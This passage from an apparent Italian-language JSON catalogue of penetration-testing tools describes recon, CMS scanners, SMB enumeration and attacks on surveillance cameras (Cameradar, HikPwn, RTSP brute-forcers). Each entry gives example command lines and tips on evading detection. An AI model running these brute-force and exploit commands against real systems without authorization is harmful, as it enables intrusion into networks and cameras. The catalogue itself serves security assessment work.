risultati sono formattati per essere passati direttamente a tool di fuzzing come GF (Grep Fuzz) o Nuclei.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale nel <strong>Bug Bounty Hunting</strong> su target molto grandi o \"hardenizzati\". Quando la homepage è sicura, ParamSpider trova quella vecchia pagina di marketing del 2018 con un parametro <code>?redirect=</code> vulnerabile a Open Redirect o XSS. In <strong>Web Application Assessment</strong>, aiuta a mappare la superficie d'attacco storica che non è linkata nell'applicazione attuale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Zero traffico verso il target durante la fase di discovery (totalmente passiva). Il traffico viene generato solo quando si testano i parametri trovati.</p><p><strong>Mitigazioni:</strong> Nessuna necessaria per la fase di discovery. Attenzione quando si inizia il probing attivo degli URL trovati (molti potrebbero essere 404).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Params_Discovery"
    ],
    "notes": null
  },
  {
    "id": "smb-enum",
    "name": "SMB-enum",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Metodologia e raccolta tool (smbclient, rpcclient, nmap) per enumerazione profonda del servizio SMB: share, utenti, gruppi e permessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SMB-enum non è un singolo software ma rappresenta l'insieme delle tecniche e tool standard utilizzati per interrogare il servizio SMB/RPC (porta 445/139). Questa fase è critica nei test interni perché SMB spesso espone informazioni preziose (user enumeration via RID cycling, null sessions) o accessi diretti (share scrivibili) che permettono di ottenere un foothold senza exploit complessi.</p><br><hr><h4 class=\"rt-purple\">Tecniche e Tool</h4><p><strong>Null Session & Guest Access:</strong> Verifica se è possibile connettersi senza credenziali (<code>rpcclient -U \"\"</code> o <code>smbclient -N</code>). Se abilitato, permette di enumerare utenti e password policy.</p><p><strong>RID Cycling:</strong> Tecnica che interroga ciclicamente gli ID relativi (RID) degli account per mappare username e gruppi, efficace anche se la lista utenti è protetta.</p><p><strong>Share Enumeration:</strong> Scansione dei permessi su cartelle condivise (SYSVOL, NETLOGON, profili) per trovare file sensibili o punti di scrittura.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si basa su utility Linux standard o script Nmap.</p><pre><code># Listare share con smbclient (Null session)\nsmbclient -L //192.168.1.10 -N\n\n# Enumerazione utenti via rpcclient\nrpcclient -U \"\" 192.168.1.10 -c \"enumdomusers\"\n\n# Nmap script automation\nnmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery target_ip\n\n# Tool automatizzato alternativo: enum4linux-ng\nenum4linux-ng -A 192.168.1.10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>È il primo passo in un <strong>Internal Pentest</strong> dopo il discovery degli host. Spesso rivela account \"Guest\" attivi o share configurate male (\"Everyone: Full Control\") che offrono accesso immediato. L'enumerazione della Password Policy via SMB è fondamentale per calibrare i successivi attacchi di password spraying senza bloccare account.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Tentativi di Null Session e scansioni Nmap sono loggati e rilevati da IDS. Il RID Cycling genera molti errori se non mirato.</p><p><strong>Mitigazioni:</strong> Usare traffico mirato. Se si possiedono credenziali valide, usarle sempre invece di tentare accessi anonimi che sono più sospetti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "postman",
    "name": "Postman",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.postman.com/downloads/",
    "desc": "Piattaforma di collaborazione per API development, usata in security per testare, fuzzare e manipolare endpoint REST/GraphQL/SOAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sebbene nato per sviluppatori, Postman è inestimabile per l'API Security Testing. Permette di costruire collezioni di richieste HTTP complesse, gestire autenticazioni (OAuth2, JWT, Bearer) e scriptare test automatici. È l'interfaccia ideale per interagire con API che non hanno un frontend web, permettendo di testare IDOR, Mass Assignment e Broken Authentication.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Collection Runner:</strong> Esegue sequenze di richieste automatiche, utile per fuzzing leggero o per riprodurre catene di exploit logici.</p><p><strong>Environment Variables:</strong> Gestisce token dinamici e variabili, facilitando il testing su ambienti diversi (dev/prod) senza riscrivere le richieste.</p><p><strong>Proxy Capture:</strong> Può catturare traffico dal browser o da mobile app per costruire automaticamente la collezione API da testare.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>GUI Desktop o Web. Importare una specifica Swagger/OpenAPI se disponibile.</p><pre><code># Workflow Security\n1. Importare Swagger file (target.yaml)\n2. Configurare Authorization (es. Bearer Token)\n3. Modificare ID nell'endpoint GET /users/{id} per testare BOLA\n4. Inviare payload JSON malformati per testare validazione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API Pentest:</strong> Quando si testa un backend REST, Postman offre un controllo granulare sui verbi HTTP (PUT, DELETE, PATCH) e sugli header, spesso necessario per trovare vuln che il browser non mostra.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Non è uno scanner automatico di vulnerabilità (anche se esistono plugin), richiede input manuale intelligente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "API"
    ],
    "notes": null
  },
  {
    "id": "cmseek-v-1-1-3",
    "name": "CMSeeK",
    "version": "1.1.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Tuhinshubhra/CMSeeK",
    "desc": "Scanner avanzato per rilevamento e analisi di oltre 180 CMS, con detection versione, plugin e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CMSeek è uno dei tool di fingerprinting più completi per Content Management Systems. Non si limita a WordPress o Joomla, ma supporta oltre 180 piattaforme diverse (Drupal, Magento, Wix, ecc.). Esegue una \"Deep Scan\" per identificare la versione esatta del CMS, enumerare gli utenti, trovare plugin installati e suggerire exploit pubblici noti per la configurazione rilevata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Deep Scan & Version Detection:</strong> Analizza codice sorgente, file statici, header HTTP e file di errore per determinare la versione precisa del CMS, fondamentale per mappare le CVE.</p><p><strong>Modularità:</strong> Include moduli specifici per WordPress (user enum, plugin enumeration) e Joomla (file backup finding), offrendo funzionalità simili a WPScan ma in un tool unificato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Interfaccia a riga di comando interattiva o diretta.</p><pre><code># Scansione standard URL\npython3 cmseek.py -u https://target.com\n\n# Scansione batch da lista siti\npython3 cmseek.py -l sites.txt --batch</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fase preliminare di <strong>Web Assessment</strong>. Quando ci si trova di fronte a un sito web sconosciuto, CMSeek identifica rapidamente la tecnologia sottostante, permettendo di scegliere poi tool di exploit specifici (es. usare WPScan solo se è confermato WordPress).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni sono attive e generano traffico riconoscibile. I WAF moderni bloccano spesso le richieste di fingerprinting se non offuscate (User-Agent).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "cmsmap",
    "name": "CMSmap",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dionach/CMSmap",
    "desc": "Scanner di vulnerabilità Python per CMS (WordPress, Joomla, Drupal, Moodle) con rilevamento plugin, temi e brute-force.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CMSmap è uno strumento centralizzato per l'audit di sicurezza dei Content Management System più diffusi. Automatizza il processo di fingerprinting per identificare versioni, plugin e temi installati, correlandoli con database di exploit pubblici (Exploit-DB) per segnalare vulnerabilità note. Integra anche moduli per attacchi di forza bruta e post-exploitation basilare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-CMS Support:</strong> Rileva e scansiona automaticamente WordPress, Joomla, Drupal e Moodle, adattando le tecniche di enumerazione alla piattaforma target senza bisogno di configurazione manuale.</p><p><strong>Vulnerability Mapping:</strong> Scarica e mantiene aggiornato un database locale di exploit. Quando rileva un plugin o una versione specifica, controlla se esistono PoC (Proof of Concept) disponibili, fornendo link diretti alle vulnerabilità.</p><p><strong>Deep Enumeration:</strong> Esegue l'enumerazione degli utenti, scan dei file di backup, e directory listing. Include un modulo per il cracking delle password via dizionario contro i pannelli di login amministrativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'esecuzione standard richiede solo l'URL del target. Il tool riconosce automaticamente il tipo di CMS.</p><pre><code># Scansione completa automatica\ncmsmap.py https://target-blog.com\n\n# Scansione WordPress con utente specifico per brute-force\ncmsmap.py https://wp-site.com -u admin -p passwords.txt\n\n# Aggiornamento database exploit\ncmsmap.py -U PC</code></pre><p>Per evitare falsi positivi o scansioni troppo lente, è possibile disabilitare il check degli exploit con <code>--noedb</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale nella fase di <strong>Web Application Assessment</strong> quando si incontrano installazioni standard di CMS. Permette di identificare rapidamente \"low hanging fruits\" come plugin non aggiornati da anni o configurazioni di default, prima di passare a test manuali più approfonditi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni complete (Full Scan) generano migliaia di richieste HTTP in breve tempo, facilmente bloccabili da WAF e plugin di sicurezza (es. Wordfence). Il brute-force triggera immediatamente alert di login falliti.</p><p><strong>Mitigazioni:</strong> Usare user-agent custom. Evitare il brute-force se non strettamente necessario. Preferire scansioni passive o mirate se il WAF è attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "joomlascan",
    "name": "JoomlaScan",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/drego85/JoomlaScan",
    "desc": "Scanner di vulnerabilità per Joomla: rileva versione, componenti installati, firewall e misconfigurazioni note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Joomlascan è l'equivalente di WPScan per il mondo Joomla. È progettato per enumerare la versione del core (analizzando file XML manifest o header), identificare componenti di terze parti installati e verificare se esistono exploit noti per essi. Offre una panoramica rapida della postura di sicurezza del CMS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Version Detection:</strong> Usa metodi euristici multipli per determinare la versione precisa, anche se offuscata nel meta tag generator.</p><p><strong>Component Enumeration:</strong> Cerca path noti di componenti popolari (es. <code>com_users</code>, <code>com_media</code>) per mappare la superficie d'attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Esecuzione perl o python.</p><pre><code># Scansione base\nperl joomlascan.pl -u https://target.com\n\n# Enumerazione componenti aggressiva\nperl joomlascan.pl -u https://target.com -ec</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Reconnaissance:</strong> Prima di lanciare exploit, è fondamentale sapere se il target usa Joomla 3.x o 4.x. Joomlascan fornisce questa intelligence.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Rumoroso. Esegue molte richieste GET che generano 404 (Not Found) nei log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "katana-linux-amd64",
    "name": "katana_linux_amd64",
    "version": "1.2.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/projectdiscovery/katana",
    "desc": "Crawler e spider web di nuova generazione per discovery approfondita di endpoint, file JS e parametri nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Katana (di ProjectDiscovery) è un crawler web progettato per l'era delle Single Page Application (SPA). A differenza dei crawler tradizionali, utilizza un motore headless (controllando Chrome) per renderizzare ed eseguire JavaScript, scoprendo link ed endpoint che vengono generati dinamicamente lato client e che sfuggirebbero a una semplice analisi HTML statica.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Headless Crawling:</strong> Esegue il codice JS della pagina per trovare link XHR/Fetch, essenziale per app React/Vue/Angular.</p><p><strong>Input Parsing:</strong> Estrae non solo URL, ma anche form, parametri e file JavaScript, alimentando pipeline di fuzzing o vulnerability scanning.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Esecuzione standard o via pipe.</p><pre><code># Crawling base\n./katana -u https://target.com\n\n# Crawling con headless mode e estrazione JS\n./katana -u https://target.com -jc -headless -d 2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Modern Web Pentest:</strong> Per mappare correttamente la superficie d'attacco di applicazioni web moderne dove gran parte del routing avviene lato client. Ottimo per alimentare tool come Nuclei o ParamSpider.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il crawling headless è lento e genera molto traffico. Comporta l'esecuzione di script di tracciamento sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "findsploit-2-0",
    "name": "Findsploit",
    "version": "2.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/1N3/Findsploit",
    "desc": "Utility CLI per ricerca rapida di exploit in database locali (Exploit-DB) e online (PacketStorm, NVD) simultaneamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Findsploit è uno script wrapper che potenzia la ricerca di exploit. A differenza di <code>searchsploit</code> che cerca solo nel database locale di Exploit-DB, Findsploit interroga simultaneamente repository online multipli, inclusi PacketStorm, NVD e CVE details. È progettato per trovare PoC recenti che potrebbero non essere ancora stati indicizzati nel database locale di Kali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Ricerca Ibrida:</strong> Combina risultati offline (veloci) con query online (aggiornate), offrendo una copertura completa.</p><p><strong>Download Diretto:</strong> Facilita il download del codice sorgente dell'exploit nella directory di lavoro corrente per analisi o compilazione immediata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sintassi semplice da riga di comando.</p><pre><code># Ricerca generica per servizio\nfindsploit wordpress 5.0\n\n# Ricerca specifica CVE\nfindsploit CVE-2024-1234</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Vulnerability Analysis</strong>, quando uno scanner riporta una CVE ma Metasploit non ha un modulo. Findsploit aiuta a trovare rapidamente script PoC Python o C da adattare manualmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Scaricare ed eseguire exploit da internet comporta rischi. Analizzare sempre il codice prima dell'esecuzione per evitare malware o danni non intenzionali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "cameradar-5-0-4",
    "name": "cameradar",
    "version": "5.0.4",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ullaakut/cameradar",
    "desc": "Scanner specializzato per discovery e accesso a telecamere RTSP di sorveglianza, con bruteforce di credenziali e route.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cameradar è uno strumento offensivo progettato per l'accesso non autorizzato a flussi di videosorveglianza RTSP (Real Time Streaming Protocol). Scansiona intere subnet alla ricerca di porte RTSP aperte (default 554, 8554) e tenta di determinare il modello della telecamera e il percorso corretto dello stream. Successivamente, esegue attacchi a dizionario per indovinare le credenziali di accesso, verificando se lo stream è accessibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Route Discovery:</strong> Le telecamere usano percorsi diversi (es. <code>/live</code>, <code>/ch0</code>, <code>/h264</code>). Cameradar include un database di migliaia di path noti per identificare quello corretto anche senza credenziali.</p><p><strong>Credential Bruteforcing:</strong> Tenta l'accesso usando liste di credenziali di default specifiche per produttori di telecamere (Hikvision, Dahua, Axis), riducendo il tempo rispetto a un bruteforce generico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si utilizza specificando target e porte.</p><pre><code># Scansione subnet con output JSON\n./cameradar -t 192.168.1.0/24 -p 554,8554 --json-output results.json\n\n# Bruteforce su target specifico con wordlist custom\n./cameradar -t 10.0.0.50 -u user.txt -P pass.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nei <strong>Physical Security Assessment</strong>, dimostrare di poter accedere alle telecamere interne permette di mappare i movimenti delle guardie o vedere codici digitati sui tastierini. Spesso le telecamere sono su VLAN separate ma accessibili per misconfigurazione di routing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molto rumoroso. Tentativi di connessione RTSP falliti riempiono i log degli NVR. Può causare il blocco temporaneo del flusso video su dispositivi hardware datati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "hikpwn",
    "name": "HikPwn",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/4n4nk3/HikPwn",
    "desc": "Tool scanner ed exploit per telecamere Hikvision vulnerabili a bypass autenticazione (CVE-2017-7921) e command injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HikPwn è uno strumento offensivo mirato ai dispositivi di videosorveglianza Hikvision. Automatizza la rilevazione di vulnerabilità critiche come la CVE-2017-7921, che permette di bypassare l'autenticazione modificando l'URL, e la CVE-2021-36260 per l'esecuzione remota di codice (RCE). Il tool può estrarre snapshot, configurazioni utente e decifrare password direttamente dalla memoria del dispositivo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auth Bypass:</strong> Verifica se il dispositivo soffre dell'improper authentication token bug, permettendo di scaricare la lista utenti senza password.</p><p><strong>Config Decryptor:</strong> Include un modulo per scaricare e decifrare il file di configurazione (contenente credenziali in chiaro) dai modelli vulnerabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python standalone.</p><pre><code># Scansione range IP\npython3 hikpwn.py -t 192.168.1.0/24\n\n# Exploit target specifico per estrarre utenti\npython3 hikpwn.py -t 192.168.1.50 --exploit users</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>IoT Security Assessment:</strong> Le telecamere sono spesso il punto di ingresso più debole in una rete fisica. HikPwn permette di dimostrare come un attaccante possa prendere il controllo della videosorveglianza senza conoscere la password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste malformate agli endpoint <code>/System/deviceInfo</code> o <code>/Security/users</code> sono loggate. L'RCE può causare riavvii del dispositivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-routes-wordlist",
    "name": "routes_wordlist.txt",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Wordlist specializzata contenente path di API, endpoint e route di framework moderni (Rails, Django, Spring) per discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>A differenza delle wordlist generiche di directory, <code>routes.txt</code> (spesso associata a Jhaddix o SecLists) è focalizzata sulle \"rotte\" applicative. Include pattern tipici di API REST (<code>/api/v1/user</code>), endpoint di debug di framework (<code>/actuator/heapdump</code>), e route amministrative che non corrispondono a file fisici ma a controller logici. È densa e ottimizzata per applicazioni moderne.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Context Aware:</strong> Contiene endpoint specifici per Spring Boot, Ruby on Rails, Node.js.</p><p><strong>High Value:</strong> Privilegia percorsi che portano a PII, configurazioni o takeover (es. <code>/console</code>, <code>/graphql</code>).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Con Gobuster o Ffuf.</p><pre><code>ffuf -u https://api.target.com/FUZZ -w routes_wordlist.txt -mc 200</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API Discovery:</strong> Quando si testa un'applicazione Single Page o Mobile backend, questa lista trova gli endpoint nascosti che non sono linkati nel frontend.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Molto grande. Usare filtri di status code per non annegare nei falsi positivi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-authgrinder",
    "name": "rtsp_authgrinder",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/tektengu/rtsp_authgrinder",
    "desc": "Bruteforcer puro per protocollo RTSP, focalizzato sulla velocità di test delle credenziali su servizi già identificati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>rtsp_authgrinder è uno strumento dedicato esclusivamente alla fase di \"Cracking\". A differenza degli scanner che cercano host, questo tool assume che il target (IP:Porta) sia già noto e si concentra sul martellare il servizio di autenticazione. È scritto per essere leggero e veloce, supportando wordlist personalizzate per utenti e password, ed è spesso utilizzato in catena con altri tool di discovery.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> Itera combinazioni user:pass contro il servizio RTSP.</p><p><strong>Error Handling:</strong> Gestisce intelligentemente i timeout e le disconnessioni tipiche dei dispositivi IoT instabili, riprovando le credenziali se la connessione cade per motivi di rete e non per auth fallita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Esecuzione da riga di comando.</p><pre><code># Attacco base\n./rtsp_authgrinder -t 192.168.1.10 -p 554 -U users.txt -P pass.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Penetration Testing mirato:</strong> Quando si trova una telecamera critica (es. sala server) e si vuole tentare un attacco esaustivo per accedervi. La gestione degli errori lo rende preferibile a Hydra su connessioni instabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera log di \"Login Failed\" massivi sul dispositivo. Può causare il blocco temporaneo dell'account admin se il dispositivo implementa lockout (raro su IoT economici).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-crack-1-0-3",
    "name": "rtsp_crack",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Tool semplice per testare credenziali di default e comuni su stream RTSP, utile per verifiche rapide di misconfigurazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>rtsp_crack è uno script di verifica rapida (\"Check & Go\"). Invece di eseguire un bruteforce esaustivo, utilizza un database interno o ridotto delle credenziali di fabbrica più comuni per i principali produttori di telecamere (Axis, Panasonic, Samsung, etc.). È progettato per la velocità: verifica se il dispositivo è lasciato con le impostazioni di default in pochi secondi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Default Credential Check:</strong> Prova una lista curata di \"Top 20\" credenziali IoT.</p><p><strong>Stream Validation:</strong> Non si limita al login, ma prova a negoziare lo stream (DESCRIBE/SETUP) per confermare che il video sia effettivamente accessibile e non solo l'interfaccia di gestione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script bash o python.</p><pre><code># Check rapido su target\npython3 rtsp_crack.py 192.168.1.50</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Vulnerability Assessment:</strong> Durante un audit di conformità, permette di verificare rapidamente se le policy di cambio password al primo avvio sono state rispettate dagli installatori.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Meno efficace contro password custom, ma molto silenzioso (pochi tentativi) rispetto a un bruteforcer completo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-digest-auth-bruteforcer",
    "name": "RTSP-Digest-Auth-Bruteforcer",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script specializzato per attaccare l'autenticazione Digest (più sicura della Basic) su stream RTSP tramite dizionario.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo tool nasce per colmare una lacuna specifica: molti bruteforcer RTSP supportano solo l'autenticazione \"Basic\" (in chiaro). <strong>rtsp-digest-auth-bruteforcer</strong> è progettato per gestire il challenge-response dell'autenticazione Digest, calcolando correttamente gli hash MD5 necessari per ogni tentativo di password. È essenziale contro telecamere IP moderne o configurate con livelli di sicurezza più elevati dove i tool generici falliscono.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Digest Handling:</strong> Intercetta il nonce fornito dal server e genera la risposta hash valida per ogni password della wordlist, automatizzando il processo matematico del protocollo.</p><p><strong>Targeting Mirato:</strong> Ottimizzato per colpire singoli flussi video persistenti, ideale per \"aprire\" una telecamera specifica individuata durante la ricognizione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e una lista di credenziali.</p><pre><code># Attacco su target specifico con user 'admin'\npython3 rtsp-digest-brute.py -u rtsp://192.168.1.50:554/live -U admin -W passwords.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>High-Security IoT Audit:</strong> Quando Nmap segnala la porta 554 aperta ma Hydra o altri tool falliscono perché il dispositivo rifiuta l'auth Basic. Questo script permette di testare la robustezza delle password anche sotto auth Digest.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'autenticazione Digest richiede più pacchetti (4-way handshake) rispetto alla Basic, rendendo l'attacco più lento e più rumoroso a livello di traffico di rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-findingsomefun",
    "name": "RTSP-FindingSomeFun",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ThatNotEasy/RTSP-FindingSomeFun",
    "desc": "Scanner RTSP massivo multi-thread per discovery di porte 554 e bruteforce simultaneo di path e credenziali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>RTSP-FindingSomeFun è uno strumento aggressivo di discovery pensato per scansionare ampi range di indirizzi IP (o l'intera internet). Combina un port scanner veloce con un motore di bruteforce per identificare telecamere esposte. La sua caratteristica distintiva è la velocità: utilizza il multithreading spinto per verificare migliaia di host, cercando di indovinare sia il percorso dello stream (es. <code>/live.sdp</code>) che le credenziali di accesso in un unico passaggio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mass Scanning:</strong> Accetta in input liste di IP o range CIDR, ignorando rapidamente gli host chiusi per concentrarsi sulle porte 554 attive.</p><p><strong>Smart Brute:</strong> Testa combinazioni di credenziali di default (admin/admin, admin/12345) e path comuni specifici per vendor (Hikvision, Dahua), massimizzando le probabilità di successo su device non configurati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Clonare la repo e lanciare lo script principale.</p><pre><code># Scansione da lista IP\npython3 rtsp.py -i ip_list.txt -t 500\n\n# Scansione range con output personalizzato\npython3 rtsp.py -r 192.168.0.0/16 --output found.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Large Scale Recon:</strong> Ideale per mappare la superficie d'attacco IoT di un'intera organizzazione o città. Permette di trovare rapidamente dispositivi dimenticati o installati da terzi senza autorizzazione (Shadow IT).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso (\"Noisy\"). Genera un volume di traffico che viene immediatamente flaggato da firewall e IPS come scansione ostile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtspscanner",
    "name": "RTSPScanner",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/BeardedTek-com/RTSPScanner",
    "desc": "Utility Python per enumerare stream RTSP su intere subnet, verificare percorsi comuni e catturare screenshot di anteprima.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>RTSPScanner è uno strumento progettato per la ricognizione di dispositivi IoT e telecamere di sicurezza che espongono il protocollo Real Time Streaming Protocol (RTSP). A differenza di un semplice port scanner, questo tool tenta attivamente di connettersi al servizio sulla porta 554 (o custom) e bruteforza i percorsi delle risorse (es. <code>/live</code>, <code>/h264</code>) per verificare l'accesso allo stream video, spesso non protetto da autenticazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mass Scanning:</strong> Accetta in input range CIDR o liste di IP e scansiona rapidamente la porta 554 in multithreading. È ottimizzato per gestire timeout brevi, permettendo di analizzare vaste reti IoT in tempi ridotti.</p><p><strong>Path Brute-forcing:</strong> Una volta rilevata una porta aperta, itera attraverso un dizionario interno di percorsi RTSP comuni (utilizzati da vendor come Hikvision, Dahua, Axis) per individuare l'URL esatto dello stream.</p><p><strong>Verifica 